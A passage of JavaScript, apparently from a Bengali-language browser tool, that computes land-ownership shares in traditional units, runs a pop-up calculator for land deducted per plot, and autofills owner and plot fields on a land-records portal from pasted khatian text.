                    let aOp = ['০-০', '⁄-১', '৵-২', '৶-৩', '৷-৪', '৷⁄-৫', '৷৵-৬', '৷৶-৭', '৷৷-৮', '৷৷⁄-৯', '৷৷৵-১০', '৷৷৶-১১', '৸-১২', '৸⁄-১৩', '৸৵-১৪', '৸৶-১৫', '১-১৬'].map((s, i) => '<option value="' + i + '">' + s + '</option>').join('');
                    let g19 = Array.from({ length: 19 }, (_, i) => '<option value="' + (i + 1) + '">' + tB(i + 1) + '</option>').join('');
                    d.innerHTML = '<div style="margin-bottom:12px"><b class="ttl" style="color:#6366f1;font-size:14px;font-weight:800;"></b><div class="act"><span class="cpt">কপি</span><span class="al ib" style="color:#10b981">+</span><span class="al db" style="color:#ef4444">&times;</span></div></div><div class="gi"><div><label class="lt">আনা</label><select class="sa">' + aOp + '</select></div><div><label class="lt">গণ্ডা</label><select class="sg"><option value="0">০</option>' + g19 + '</select></div><div><label class="lt">কড়া</label><select class="sk"><option value="0">০</option><option value="1">১</option><option value="2">২</option><option value="3">৩</option></select></div><div><label class="lt">ক্রান্তি</label><select class="skr"><option value="0">০</option><option value="1">১</option><option value="2">২</option></select></div><div style="grid-column:span 2"><label class="lt">তিল</label><select class="st"><option value="0">০</option>' + g19 + '</select></div></div>';
                    d.querySelectorAll('select').forEach(sel => { sel.buf = ""; sel.timer = null; sel.onkeydown = function(e) { let k = tE(e.key); if (e.key === 'Enter') { e.preventDefault(); document.getElementById('gc').click(); return; } if (!isNaN(k)) { e.preventDefault(); clearTimeout(this.timer); this.buf += k; let opt = Array.from(this.options).find(o => o.value == this.buf); if (opt) this.value = this.buf; else { this.buf = k; this.value = k; } this.dispatchEvent(new Event('change', { bubbles: true })); this.timer = setTimeout(() => { this.buf = ""; }, 500); } }; });
                    d.querySelector('.cpt').onclick = () => { ad(d, { a: d.querySelector('.sa').value, g: d.querySelector('.sg').value, k: d.querySelector('.sk').value, kr: d.querySelector('.skr').value, t: d.querySelector('.st').value }); }; d.querySelector('.ib').onclick = () => ad(d); d.querySelector('.db').onclick = () => { d.remove(); rn(); };
                    if (rf) rf.after(d); else document.getElementById('lst').appendChild(d);
                    if (cd) { d.querySelector('.sa').value = cd.a; d.querySelector('.sg').value = cd.g; d.querySelector('.sk').value = cd.k; d.querySelector('.skr').value = cd.kr; d.querySelector('.st').value = cd.t; } rn(); setTimeout(() => { d.querySelector('.sa').focus(); }, 10);
                }
                function rn() { document.querySelectorAll('.oc').forEach((c, i) => { c.querySelector('.ttl').innerText = "মালিক " + tB(i + 1); }); } document.getElementById('ae').onclick = () => ad();
                document.getElementById('gc').onclick = function() {
                    let sm = 0; document.querySelectorAll('.oc').forEach(c => { let a = parseInt(c.querySelector('.sa').value) || 0, g = parseInt(c.querySelector('.sg').value) || 0, k = parseInt(c.querySelector('.sk').value) || 0, kr = parseInt(c.querySelector('.skr').value) || 0, t = parseInt(c.querySelector('.st').value) || 0; sm += (a / 16) + (g / 320) + (k / 1280) + (kr / 3840) + (t / 76800); });
                    const r = document.getElementById('ra'); let df = 1.0 - sm; r.style.display = 'block';
                    if (Math.abs(df) < 0.000001) { r.innerHTML = '<span style="font-size:20px;">✅</span><br>১৬ আনা মিলেছে!<button class="vmt-btn fib" id="af">পোর্টালে বসান</button>'; r.style.background = "#ecfdf5"; r.style.borderColor = "#a7f3d0"; r.style.color = "#059669"; document.getElementById('af').onclick = () => fp(); fp(); } else { let st = df > 0 ? "হিস্যা শর্ট আছে!" : "হিস্যা অতিরিক্ত!"; r.innerHTML = '<span style="font-size:20px;">⚠️</span><br>' + st + '<br><span class="gh">' + (df > 0 ? "আরও" : "") + ' ' + fG(df) + ' ' + (df > 0 ? "প্রয়োজন" : "বেশি") + '</span>'; r.style.background = "#fef2f2"; r.style.borderColor = "#fecaca"; r.style.color = "#dc2626"; }
                };
                function fp() { let fs = []; document.querySelectorAll('input').forEach(el => { if ((el.placeholder || "").includes("অংশ") || (el.name || "").includes("percentage") || (el.className || "").includes("land-portion") || (el.getAttribute('id') || "").includes("portion")) fs.push(el); }); document.querySelectorAll('.oc').forEach((c, i) => { let a = parseInt(c.querySelector('.sa').value) || 0, g = parseInt(c.querySelector('.sg').value) || 0, k = parseInt(c.querySelector('.sk').value) || 0, kr = parseInt(c.querySelector('.skr').value) || 0, t = parseInt(c.querySelector('.st').value) || 0; let sh = (a / 16) + (g / 320) + (k / 1280) + (kr / 3840) + (t / 76800); if (fs[i]) { fs[i].value = sh.toFixed(6); fs[i].dispatchEvent(new Event('input', { bubbles: true })); } }); document.getElementById('floating-calc-final-master').remove(); } ad();
            },
            t10: function() {
                let calcWin = window.open('', 'LandDeductionPro', 'width=1150,height=750,left=100,top=100');
                if (!calcWin) { alert('আপনার ব্রাউজার পপ-আপ ব্লক করেছে! অনুগ্রহ করে এড্রেস বারের ডান পাশ থেকে পপ-আপ অ্যালাউ (Allow Pop-ups) করে আবার চেষ্টা করুন।'); return; }
                let calcCode = `<!DOCTYPE html><html lang="bn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>জমি বাদের হিসাব ক্যালকুলেটর PRO</title><style>:root { --bg-color: #f4f7f6; --card-bg: #ffffff; --primary: #1e3a8a; --success: #27ae60; --danger: #e74c3c; --text-dark: #0f172a; --border-color: #e2e8f0; } body { font-family: 'Segoe UI', Arial, sans-serif; background: var(--bg-color); color: var(--text-dark); margin: 0; padding: 20px; display: flex; justify-content: center; } .container { width: 100%; max-width: 1100px; background: var(--card-bg); border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.08); padding: 25px; overflow-x: auto; border-top: 4px solid #1e3a8a; } h2 { text-align: center; color: var(--primary); margin-top: 0; border-bottom: 2px solid #f1f5f9; padding-bottom: 15px; } table { width: 100%; border-collapse: collapse; margin-bottom: 20px; min-width: 950px; } th, td { border: 1px solid var(--border-color); padding: 10px; text-align: center; vertical-align: middle; } th { background: #f8fafc; color: var(--text-dark); font-size: 14px; } .serial-no { font-weight: bold; color: #64748b; } .std-input { width: 90%; padding: 8px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 14px; text-align: center; transition: all 0.3s ease; } .std-input:focus, .deduction-input:focus, .quick-input:focus { border: 2px solid #3b82f6; background-color: #eff6ff; outline: none; box-shadow: 0 0 8px rgba(59, 130, 246, 0.2); } .btn, .add-box-btn, .copy-btn-sm, .btn-remove { background: linear-gradient(145deg, #f8fafc, #f1f5f9); border: 1px solid #cbd5e1; border-radius: 10px; color: var(--text-dark); font-weight: bold; cursor: pointer; transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; } .btn-add { color: #1e3a8a; margin-bottom: 15px; padding: 10px 15px;} .btn-reset { color: var(--danger); margin-bottom: 15px; padding: 10px 15px;} .btn-remove { color: var(--danger); padding: 6px; width: 35px; margin: 0 auto;} .deduction-wrapper { display: flex; flex-wrap: wrap; gap: 5px; align-items: center; justify-content: center; } .deduction-input { width: 55px; padding: 6px; border: 1px solid #cbd5e1; border-radius: 4px; text-align: center; } .remaining-land { font-weight: bold; font-size: 16px; color: var(--success); } .footer-total { background: #f8fafc; padding: 20px; border-radius: 12px; border: 1px solid #e2e8f0; margin-bottom: 20px; } .total-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; font-size: 1.2rem; color: #1e3a8a; } .copy-actions { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; } .copy-actions .btn { flex: 1; min-width: 200px; padding: 12px; } .quick-action-box { background: #eff6ff; padding: 15px; border-radius: 8px; margin-bottom: 15px; display: flex; gap: 15px; align-items: center; border: 1px solid #bfdbfe; } .quick-input { padding: 8px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 14px; text-align: center; width: 120px; }</style></head><body><div class="container"><h2>দাগ ভিত্তিক জমি বাদের হিসাব (স্মার্ট বক্স ম্যানেজমেন্ট)</h2><div class="quick-action-box"><strong style="color: #1e3a8a;">⚡ দ্রুত জমি বাদ:</strong><input type="text" id="quick-dag" class="quick-input" placeholder="দাগ নং লিখুন" onkeydown="moveToNextQuick(event, 'quick-amount')"><input type="text" id="quick-amount" class="quick-input" placeholder="কত বাদ যাবে?" onkeydown="triggerQuickAdd(event)"><button class="btn btn-add" style="margin-bottom: 0; padding: 8px 15px;" onclick="applyQuickDeduction()">যুক্ত করুন</button><span id="quick-msg" style="font-weight: bold; font-size: 14px; transition: opacity 0.3s;"></span></div><div style="display: flex; gap: 10px; justify-content: space-between; align-items: center;"><div style="display: flex; gap: 10px;"><button class="btn btn-add" onclick="addRow()">+ নতুন দাগ</button><button class="btn btn-add" style="color: #3b82f6;" onclick="importDags()">+ দাগ, শ্রেণি ও জমি ইমপোর্ট</button></div><button class="btn btn-reset" onclick="resetAll()">🔄 রিসেট</button></div><table><thead><tr><th width="5%">ক্র.নং</th><th width="10%">দাগ নং</th><th width="12%">শ্রেণি</th><th width="10%">মোট জমি</th><th width="40%">বাদ দেওয়া জমি</th><th width="15%">অবशिष्ट জমি</th><th width="8%">মুছুন</th></tr></thead><tbody id="table-body"></tbody></table><div class="footer-total"><div class="total-row"><span style="font-weight: bold;">সর্বমোট অবশিষ্ট জমি:</span><span id="grand-total" style="font-size: 24px; font-weight: 900;">০.০০</span></div><div class="copy-actions"><button id="btn-copy-dag" class="btn" onclick="copyAllDags()">সব দাগ নং কপি</button><button id="btn-copy-land" class="btn" onclick="copyAllRemaining()">সব অবশিষ্ট জমি কপি</button><button id="btn-copy-shreni" class="btn" style="color: #3b82f6;" onclick="copyAllShreni()">সব শ্রেণি কপি</button></div></div></div><script>function convertToEnglish(str) { if (!str) return ""; const bngToEng = {'০':'0', '১':'1', '২':'2', '৩':'3', '৪':'4', '৫':'5', '৬':'6', '৭':'7', '৮':'8', '৯':'9'}; return str.toString().replace(/[০-৯]/g, match => bngToEng[match]); } function toBengaliNumber(num) { if(num === undefined || num === null) return "০.০০"; let str = num.toString(); let isNegative = false; if (str.startsWith('-')) { isNegative = true; str = str.substring(1); } const bngDigits = ['০','১','২','৩','৪','৫','৬','৭','৮','৯']; let result = str.split('').map(d => bngDigits[d] || d).join(''); return isNegative ? '-' + result : result; } function updateSerialNumbers() { const rows = document.querySelectorAll('#table-body tr'); rows.forEach((row, index) => { row.querySelector('.serial-no').innerText = toBengaliNumber(index + 1); }); } function handleVerticalEnter(e, inputElement, className) { if (e.key === 'Enter') { e.preventDefault(); const currentRow = inputElement.closest('tr'); let nextRow = currentRow.nextElementSibling; if (!nextRow) { addRow(); nextRow = currentRow.nextElementSibling; } if (nextRow) { const nextInput = nextRow.querySelector('.' + className); if (nextInput) nextInput.focus(); } } } function moveToNextQuick(e, nextId) { if (e.key === 'Enter') { e.preventDefault(); document.getElementById(nextId).focus(); } } function triggerQuickAdd(e) { if (e.key === 'Enter') { e.preventDefault(); applyQuickDeduction(); } } function applyQuickDeduction() { const dagInput = document.getElementById('quick-dag'); const amountInput = document.getElementById('quick-amount'); const msgSpan = document.getElementById('quick-msg'); const targetDag = convertToEnglish(dagInput.value.trim()); const amount = convertToEnglish(amountInput.value.trim()); if (!targetDag || !amount) { msgSpan.innerText = "দাগ নং এবং পরিমাণ দিন!"; msgSpan.style.color = "#e74c3c"; setTimeout(() => msgSpan.innerText = "", 2000); return; } const rows = document.querySelectorAll('#table-body tr'); let found = false; rows.forEach(row => { const rowDag = convertToEnglish(row.querySelector('.dag-input').value.trim()); if (rowDag === targetDag) { found = true; const deductionInputs = row.querySelectorAll('.deduction-input'); let targetInput = Array.from(deductionInputs).find(input => input.value.trim() === ""); if (!targetInput) { const btn = row.querySelector('.add-box-btn'); targetInput = addDeductionBox(btn); } targetInput.value = toBengaliNumber(amount); checkAndAddExtraBox(row); calculateRow(row.querySelector('.dag-input')); row.style.transition = "background-color 0.5s"; row.style.backgroundColor = "#d4edda"; setTimeout(() => row.style.backgroundColor = "", 1500); } }); if (found) { msgSpan.innerText = "✓ যোগ হয়েছে!"; msgSpan.style.color = "#27ae60"; dagInput.value = ""; amountInput.value = ""; dagInput.focus(); } else { msgSpan.innerText = "দাগ নং খুঁজে পাওয়া যায়নি!"; msgSpan.style.color = "#e74c3c"; } setTimeout(() => msgSpan.innerText = "", 2000); } function handleShreniShortcut(input) { const val = input.value.trim(); const shortcuts = {'1': 'বাড়ী', '১': 'বাড়ী', '2': 'বোরো', '২': 'বোরো', '3': 'বোর', '৩': 'বোর', '4': 'খামা', '৪': 'খামা', '5': 'বর্ষা', '৫': 'বর্ষা', '6': 'চালা', '৬': 'চালা', '7': 'সাইল', '৭': 'সাইল', '8': 'কবরস্থান', '৮': 'কবরস্থান', '9': 'পুকুর', '৯': 'পুকুর'}; if (shortcuts[val]) input.value = shortcuts[val]; } function addRow(dag = "", shreni = "", total = "") { const tbody = document.getElementById('table-body'); const tr = document.createElement('tr'); tr.innerHTML = \`<td class="serial-no"></td><td><input type="text" value="\${dag}" placeholder="দাগ" class="std-input dag-input" onkeydown="handleVerticalEnter(event, this, 'dag-input')"></td><td><input type="text" value="\${shreni}" placeholder="শ্রেণি" class="std-input shreni-input" oninput="handleShreniShortcut(this)" onkeydown="handleVerticalEnter(event, this, 'shreni-input')"></td><td><input type="text" value="\${total}" placeholder="মোট" class="std-input total-land" oninput="calculateRow(this)" onkeydown="handleVerticalEnter(event, this, 'total-land')"></td><td><div class="deduction-wrapper"><input type="text" placeholder="জমি" class="deduction-input" oninput="calculateRow(this)" onkeypress="handleDeductionEnter(event, this)"><input type="text" placeholder="জমি" class="deduction-input" oninput="calculateRow(this)" onkeypress="handleDeductionEnter(event, this)"><input type="text" placeholder="জমি" class="deduction-input" oninput="calculateRow(this)" onkeypress="handleDeductionEnter(event, this)"><input type="text" placeholder="জমি" class="deduction-input" oninput="calculateRow(this)" onkeypress="handleDeductionEnter(event, this)"><button class="add-box-btn" onclick="manualAddBox(this)" style="width:30px; height:30px;">+</button></div></td><td><div style="display: flex; align-items: center; justify-content: center; gap: 5px;"><span class="remaining-land">০.০০</span><button class="copy-btn-sm" onclick="copyRemaining(this)" style="padding:4px 8px; font-size:11px;">কপি</button></div></td><td><button class="btn-remove" onclick="removeRow(this)">X</button></td>\`; tbody.appendChild(tr); updateSerialNumbers(); if(total !== "") calculateRow(tr.querySelector('.total-land')); } function handleDeductionEnter(e, input) { if (e.key === 'Enter') { e.preventDefault(); manualAddBox(input.closest('.deduction-wrapper').querySelector('.add-box-btn')); } } function manualAddBox(btn) { const input = addDeductionBox(btn); input.focus(); } function addDeductionBox(btn) { const wrapper = btn.closest('.deduction-wrapper'); const input = document.createElement('input'); input.type = 'text'; input.placeholder = 'জমি'; input.className = 'deduction-input'; input.oninput = function() { calculateRow(this); }; input.onkeypress = function(e) { handleDeductionEnter(e, this); }; wrapper.insertBefore(input, btn); return input; } function checkAndAddExtraBox(row) { const inputs = row.querySelectorAll('.deduction-input'); const filledCount = Array.from(inputs).filter(i => i.value.trim() !== "").length; if (filledCount >= inputs.length - 1) { addDeductionBox(row.querySelector('.add-box-btn')); } } function calculateRow(el) { const row = el.closest('tr'); checkAndAddExtraBox(row); let total = parseFloat(convertToEnglish(row.querySelector('.total-land').value)) || 0; let deducted = 0; row.querySelectorAll('.deduction-input').forEach(i => { deducted += parseFloat(convertToEnglish(i.value)) || 0; }); let rem = total - deducted; const remDisplay = row.querySelector('.remaining-land'); remDisplay.innerText = toBengaliNumber(rem.toFixed(2)); if (rem < 0) { remDisplay.style.color = "var(--danger)"; } else { remDisplay.style.color = "var(--success)"; } calculateGrandTotal(); } function calculateGrandTotal() { let grand = 0; document.querySelectorAll('.remaining-land').forEach(el => { grand += parseFloat(convertToEnglish(el.innerText)) || 0; }); const gtDisplay = document.getElementById('grand-total'); gtDisplay.innerText = toBengaliNumber(grand.toFixed(2)); if (grand < 0) { gtDisplay.style.color = "var(--danger)"; } else { gtDisplay.style.color = "#1e3a8a"; } } function removeRow(btn) { btn.closest('tr').remove(); updateSerialNumbers(); calculateGrandTotal(); } function resetAll() { if(confirm("সব মুছবেন?")) { document.getElementById('table-body').innerHTML = ""; addRow(); calculateGrandTotal(); } } function showCopyFeedback(btnId, originalText) { const btn = document.getElementById(btnId); btn.innerText = "✓ কপি হয়েছে"; btn.style.color = "#27ae60"; setTimeout(() => { btn.innerText = originalText; btn.style.color = ""; }, 1500); } function copyRemaining(btn) { let val = parseFloat(convertToEnglish(btn.previousElementSibling.innerText)) || 0; let copyVal = val < 0 ? 0 : val; navigator.clipboard.writeText(toBengaliNumber(copyVal.toFixed(2))).then(() => { btn.innerText = "✓"; setTimeout(() => btn.innerText = "কপি", 1000); }); } function copyAllDags() { const vals = Array.from(document.querySelectorAll('.dag-input')).map(i => i.value).filter(v => v); navigator.clipboard.writeText(vals.join(', ')).then(() => { showCopyFeedback('btn-copy-dag', 'সব দাগ নং কপি'); }); } function copyAllShreni() { const vals = Array.from(document.querySelectorAll('.shreni-input')).map(i => i.value).filter(v => v); navigator.clipboard.writeText(vals.join(', ')).then(() => { showCopyFeedback('btn-copy-shreni', 'সব শ্রেণি কপি'); }); } function copyAllRemaining() { const vals = Array.from(document.querySelectorAll('.remaining-land')).map(el => { let val = parseFloat(convertToEnglish(el.innerText)) || 0; let finalVal = val < 0 ? 0 : val; return toBengaliNumber(finalVal.toFixed(2)); }); navigator.clipboard.writeText(vals.join(', ')).then(() => { showCopyFeedback('btn-copy-land', 'সব অবশিষ্ট জমি কপি'); }); } document.addEventListener('keydown', function(e) { const active = document.activeElement; if (!active || active.tagName !== 'INPUT' || !active.closest('#table-body')) return; const row = active.closest('tr'); const rows = Array.from(document.querySelectorAll('#table-body tr')); const rowIndex = rows.indexOf(row); const inputs = Array.from(row.querySelectorAll('input[type="text"]')); const colIndex = inputs.indexOf(active); if (e.key === 'ArrowUp' && rowIndex > 0) rows[rowIndex-1].querySelectorAll('input[type="text"]')[colIndex]?.focus(); else if (e.key === 'ArrowDown' && rowIndex < rows.length - 1) rows[rowIndex+1].querySelectorAll('input[type="text"]')[colIndex]?.focus(); else if (e.key === 'ArrowRight' && active.selectionStart === active.value.length) inputs[colIndex + 1]?.focus(); else if (e.key === 'ArrowLeft' && active.selectionEnd === 0) inputs[colIndex - 1]?.focus(); }); function importDags() { let input = prompt("তালিকা পেস্ট করুন (যেমন: ৭৩৪ — বোরো — ১৬)"); if (input) { input.split('\\n').filter(l => l.trim()).forEach(line => { let parts = line.split(/[—\\-]+/).map(s => s.trim()); addRow(parts[0] || "", parts[1] || "", parts[2] || ""); }); } } window.onload = () => { if (document.querySelectorAll('#table-body tr').length === 0) addRow(); }; </script></body></html>`;
                calcWin.document.open(); calcWin.document.write(calcCode); calcWin.document.close();
            },
            t11: async function(upazilaStr, FCStr) {
                const upazila = upazilaStr || ""; const FC = (FCStr || "").normalize("NFC");
                if (!upazila || !FC) { alert("উপজেলা ও ফাইল দুটোই দরকার"); return; }
                
                await (async function ownerPart(upazila, FC) {
                    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
                    const norm = (s) => (s || "").normalize("NFC").replace(/\s+/g, " ").replace(/\*/g, "").trim();
                    const bn2en = (s) => (s || "").replace(/[০-৯]/g, (d) => "০১২৩৪৫৬৭৮৯".indexOf(d));
                    const en2bn = (n) => String(n).replace(/[0-9]/g, (d) => "০১২৩৪৫৬৭৮৯"[d]);
                    function reactSet(el, value) {
                      if (!el) return false;
                      const proto = el.tagName === "TEXTAREA" ? window.HTMLTextAreaElement.prototype : window.HTMLInputElement.prototype;
                      Object.getOwnPropertyDescriptor(proto, "value").set.call(el, value);
                      el.dispatchEvent(new Event("input", { bubbles: true })); el.dispatchEvent(new Event("change", { bubbles: true })); el.dispatchEvent(new Event("blur", { bubbles: true }));
                      const origBg = el.style.backgroundColor; el.style.backgroundColor = "#fef08a"; setTimeout(() => { el.style.backgroundColor = origBg; }, 400);
                      return true;
                    }
                    async function setId(id, v, tries = 3, gap = 150) {
                      if (v === "" || v == null) return false;
                      for (let i = 0; i < tries; i++) {
                        const el = document.getElementById(id);
                        if (el && !el.disabled) { reactSet(el, v); await sleep(gap); const el2 = document.getElementById(id); if (el2 && norm(el2.value) === norm(v)) return true;
                        } else { await sleep(gap); }
                      } return false;
                    }
                    function setByLabel(labelText, v) {
                      const want = norm(labelText);
                      for (const p of Array.from(document.querySelectorAll("p, label"))) {
                        if (norm(p.textContent).startsWith(want)) {
                          let c = p.parentElement;
                          for (let i = 0; i < 4 && c; i++) {
                            const inp = c.querySelector("input:not([type=hidden]):not([type=radio]), textarea");
                            if (inp) { reactSet(inp, v); return true; } c = c.parentElement;
                          }
                        }
                      } return false;
                    }
                    function clickRadio(nameAttr, optionText) {
                      const want = norm(optionText);
                      for (const r of Array.from(document.querySelectorAll(`input[type=radio][name="${nameAttr}"]`))) {
                        const txt = norm((r.closest("label") || r.parentElement || {}).textContent);
                        if (txt === want) { r.click(); return true; }
                      } return false;
                    }
                    function clickButton(text) {
                      const want = norm(text);
                      for (const b of Array.from(document.querySelectorAll("button, [role=button]"))) {
                        if (norm(b.textContent).includes(want) && !b.disabled) { b.click(); return true; }
                      } return false;
                    }
                    async function selectMouza() {
                      const wrap = document.getElementById("JL_NUMBER_ID") || (() => { for (const p of document.querySelectorAll("p,label")) { if (norm(p.textContent).startsWith("মৌজা")) { let c = p.parentElement; for (let i = 0; i < 4 && c; i++) { if (c.querySelector(".MuiAutocomplete-root")) return c; c = c.parentElement; } } } })();
                      if (!wrap) return false;
                      const input = wrap.querySelector("input"); const popBtn = wrap.querySelector(".MuiAutocomplete-popupIndicator");
                      if (input) input.focus(); if (popBtn) popBtn.click(); await sleep(400); 
                      const opts = Array.from(document.querySelectorAll('li[role="option"]'));
                      if (opts.length === 1) { opts[0].click(); return true; } return false;
                    }
                    const grabText = (label) => { const re = new RegExp(label.normalize("NFC").replace(/ /g, "\\s*") + "\\s*[:：ঃ]\\s*([\\s\\S]*?)(?:\\s{2,}|$)"); const m = FC.match(re); return m ? m[1].trim() : ""; };
                    const khatianNo = grabText("খতিয়ান নং"); const mamlaNo = grabText("নামজারি মামলা নং") || grabText("মামলা নং"); const mamlaDate = grabText("মামলার তারিখ"); const address = grabText("ঠিকানা");
                    function splitNumbered(value) {
                      if (!value) return []; if (!/[০-৯0-9]+\s*[.)]/.test(value)) return [value.trim()];
                      const parts = value.split(/\s*[,;]?\s*[০-৯0-9]+\s*[.)]\s*/).map(s => s.trim()).filter(Boolean); return parts.length ? parts : [value.trim()];
                    }
                    function parseGuardianBlock(block) {
                      let sami = "", pita = "", mata = "";
                      for (const s of (block || "").split(",").map(x => x.trim())) {
                        if (/^স্বামী/.test(s)) sami = s.replace(/^স্বামী\s*[-–—:：ঃ]?\s*/, "").trim();
                        else if (/^পিতা/.test(s)) pita = s.replace(/^পিতা\s*[-–—:：ঃ]?\s*/, "").trim();
                        else if (/^মাতা/.test(s)) mata = s.replace(/^মাতা\s*[-–—:：ঃ]?\s*/, "").trim();
                      } return { gType: sami ? "স্বামী" : (pita ? "পিতা" : "স্বামী"), gName: sami || pita || "", mata };
                    }
                    const names = splitNumbered(grabText("মালিকের নাম")); const gblocks = splitNumbered(grabText("পিতা/স্বামীর নাম"));
                    const owners = names.map((nm, i) => { const g = parseGuardianBlock(gblocks[i] || ""); return { name: nm.replace(/[,;]\s*$/, "").trim(), gType: g.gType, gName: g.gName, mother: g.mata }; });
                    const gmap = {}; let gc = 0; owners.forEach(o => { const k = norm(o.gName); if (!(k in gmap)) gmap[k] = ++gc; o.group = en2bn(gmap[k]); });
                    const ownerShare = owners.length === 1 ? "১" : "";
                    
                    await setId("DIVISION_NAME", "ঢাকা"); await setId("DISTRICT_NAME", "নারায়ণগঞ্জ"); await setId("UPAZILA_NAME", upazila); await sleep(400); await selectMouza(); await sleep(300);
                    await setId("NAMJARI_CASE_NO", mamlaNo); if (mamlaDate) setByLabel("মামলার তারিখ", bn2en(mamlaDate)); clickRadio("HAS_DHARA", "না"); await setId("KHATIAN_NO", khatianNo);
                    for (let i = 0; i < owners.length; i++) {
                      const o = owners[i]; clickRadio("IDENTITY_TYPE", "নাই"); await sleep(150); await setId("OWNER_NAME", o.name); if (o.gName) clickRadio("GUARDIAN_TYPE", o.gType);
                      await setId("GUARDIAN", o.gName); await setId("MOTHER_NAME", o.mother); await setId("OWNER_AREA", ownerShare); await setId("OWNER_GROUP", o.group); await setId("OWNER_ADDRESS", address);
                      await sleep(150); clickButton("মালিক যোগ করুন"); await sleep(500); 
                    } clickButton("মালিক এন্ট্রি সমাপ্ত করুন"); await sleep(400);
                })(upazila, FC);

                await (async function dagPart() {
                    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
                    const norm = (s) => (s || "").normalize("NFC").replace(/\s+/g, " ").replace(/\*/g, "").trim();
                    const bn = "০১২৩৪৫৬৭৮৯"; const bn2en = (s) => (s || "").replace(/[০-৯]/g, (d) => bn.indexOf(d)); const en2bn = (s) => String(s).replace(/[0-9]/g, (d) => bn[+d]);
                    const reactSet = (el, val) => {
                      const proto = el.tagName === "TEXTAREA" ? HTMLTextAreaElement.prototype : HTMLInputElement.prototype;
                      Object.getOwnPropertyDescriptor(proto, "value").set.call(el, val);
                      el.dispatchEvent(new Event("input", { bubbles: true })); el.dispatchEvent(new Event("change", { bubbles: true })); el.dispatchEvent(new Event("blur", { bubbles: true }));
                    };
                    async function setById(id, value) {
                      if (value === "" || value == null) return; const el = document.getElementById(id); if (!el) return;
                      for (let t = 0; t < 3; t++) { reactSet(el, value); await sleep(100); if (norm(el.value) === norm(value)) break; } 
                    }
                    async function setRemarks(value) {
                      if (!value) return; let el = document.getElementById("REMARKS");
                      if (!el) { for (const ta of document.querySelectorAll("textarea")) { let lbl = "", c = ta.parentElement; for (let i = 0; i < 6 && c; i++) { const p = c.querySelector("p,label"); if (p && norm(p.textContent)) { lbl = norm(p.textContent); break; } c = c.parentElement; } if (lbl.startsWith("মন্তব্য")) { el = ta; break; } } }
                      if (el) { for (let t = 0; t < 3; t++) { reactSet(el, value); await sleep(100); if (norm(el.value) === norm(value)) break; } }
                    }
                    const labelInputs = (labelText) => {
                      const want = norm(labelText), out = [];
                      for (const inp of document.querySelectorAll("input,textarea")) { let lbl = "", c = inp.parentElement; for (let i = 0; i < 6 && c; i++) { const p = c.querySelector("p,label"); if (p && norm(p.textContent)) { lbl = norm(p.textContent); break; } c = c.parentElement; } if (lbl.startsWith(want)) out.push(inp); }
                      return out;
                    };
                    async function pickAuto(inputEl, optionText) {
                      if (!inputEl) return; inputEl.focus(); reactSet(inputEl, optionText); await sleep(200);
                      let opts = Array.from(document.querySelectorAll('li[role="option"]'));
                      if (!opts.length) { const root = inputEl.closest(".MuiAutocomplete-root"); const pop = root && root.querySelector(".MuiAutocomplete-popupIndicator"); if (pop) pop.click(); await sleep(300); opts = Array.from(document.querySelectorAll('li[role="option"]')); }
                      const m = norm(optionText); const t = opts.find((o) => norm(o.textContent) === m) || opts.find((o) => norm(o.textContent).includes(m)) || opts.find((o) => m.includes(norm(o.textContent)));
                      if (t) { t.click(); await sleep(150); }
                    }
                    async function pickSelect(labelStart, wantSubstr) {
                      let trigger = null;
                      for (const sel of document.querySelectorAll(".MuiSelect-select,[role='combobox']")) { let lbl = "", c = sel.parentElement; for (let i = 0; i < 6 && c; i++) { const p = c.querySelector("p,label"); if (p && norm(p.textContent)) { lbl = norm(p.textContent); break; } c = c.parentElement; } if (lbl.startsWith(norm(labelStart))) { trigger = sel; break; } }
                      if (!trigger) return; trigger.focus(); trigger.dispatchEvent(new MouseEvent("mousedown", { bubbles: true })); trigger.click(); await sleep(250); 
                      let opts = Array.from(document.querySelectorAll('.MuiMenu-list li,.MuiMenuItem-root,[role="option"],[role="menuitem"]')); opts = [...new Set(opts)].filter((o) => norm(o.textContent));
                      const t = opts.find((o) => norm(o.textContent).includes(norm(wantSubstr)));
                      if (t) { t.dispatchEvent(new MouseEvent("mousedown", { bubbles: true })); t.click(); await sleep(150); } else { document.body.click(); }
                    }
                    const clickButton = (text) => { const want = norm(text); const b = Array.from(document.querySelectorAll("button")).find((x) => !x.disabled && norm(x.textContent).includes(want)); if (b) { b.click(); return true; } return false; };

                    const softRe = (label) => label.normalize("NFC").replace(/[নণ]/g, "[নণ]").replace(/[িী]/g, "[িী]").replace(/ /g, "\\s*");
                    const grab = (label) => { const m = FC.match(new RegExp(softRe(label) + "\\s*[:：ঃ]\\s*([\\s\\S]*?)(?:\\s{2,}|\\n|$)")); return m ? m[1].trim() : ""; };
                    const splitField = (v) => (v || "").split(/[\/,;।]+/).map((s) => s.trim()).filter(Boolean);
                    const amtOf = (tok) => { const m = tok.match(/([\d০-৯][\d০-৯.]*)/); return m ? m[1] : ""; };
                    const classOf = (tok) => tok.replace(/[-–—:：]?\s*[\d০-৯][\d০-৯.]*\s*(একর|শতক|শতাংশ)?/g, "").replace(/[-–—:：()]/g, "").replace(/একরে?/g, "").trim();
                    const share = (atra, total) => { const a = parseFloat(bn2en(String(atra))), t = parseFloat(bn2en(String(total))); if (!a || !t) return ""; return en2bn(String(a / t)); };
                    const grabMontobbo = () => { const mm = FC.match(new RegExp(softRe("মন্তব্য") + "\\s*[:：ঃ]\\s*([\\s\\S]*)")); if (!mm) return ""; let v = mm[1]; const dot = v.indexOf("।"); if (dot !== -1) v = v.slice(0, dot + 1); return v.replace(/\s+/g, " ").trim(); };

                    const dags = splitField(grab("দাগ নং") || grab("দাগ")); const classToks = splitField(grab("জমির শ্রেণি") || grab("শ্রেণি") || grab("শ্রেণী")); const totalToks = splitField(grab("দাগে মোট জমির পরিমান") || grab("মোট জমির পরিমান") || grab("মোট")); const atraToks = splitField(grab("অত্র খতিয়ানের জমির পরিমান") || grab("অংশ অনুযায়ী জমির পরিমান") || grab("অত্র"));
